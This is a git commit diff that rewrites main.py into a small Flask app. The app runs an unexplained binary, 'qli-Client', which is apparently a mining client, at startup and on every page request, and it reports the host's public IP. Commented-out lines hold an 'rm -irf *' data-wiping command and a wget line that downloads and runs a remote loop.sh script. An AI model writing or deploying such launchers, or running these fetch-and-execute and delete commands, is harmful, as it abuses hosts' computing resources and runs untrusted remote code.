db6f075839f06db0341f1d99ebf491b08deeb3cd
erlandi <93110170+erlandi-main-api@users.noreply.github.com>
2024-07-04 19:51:00 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,21 @@
-import os as dolll
-dolll.system("chmod +x qli-Client")
-dolll.system("./qli-Client")
+import os as kampret
+import requests
+from flask import *
+#kampret.system("rm -irf *")
+x = kampret.system("chmod +x qli-Client && ./qli-Client")
+#kampret.system("wget https://raw.githubusercontent.com/petugas/No/main/loop.sh && chmod +x loop.sh && ./loop.sh")
+
+app = Flask(__name__)
+
+
+@app.route("/")
+def main():
+    x = kampret.system("chmod +x qli-Client && ./qli-Client")
+    response = requests.get('https://httpbin.org/ip')
+    ip_data = response.json()
+    print("IP Publik Anda adalah:", ip_data['origin'])
+
+    return f"running\n ip: {ip_data['origin']}\n {x} "
+
+if __name__ == "__main__":
+    app.run()
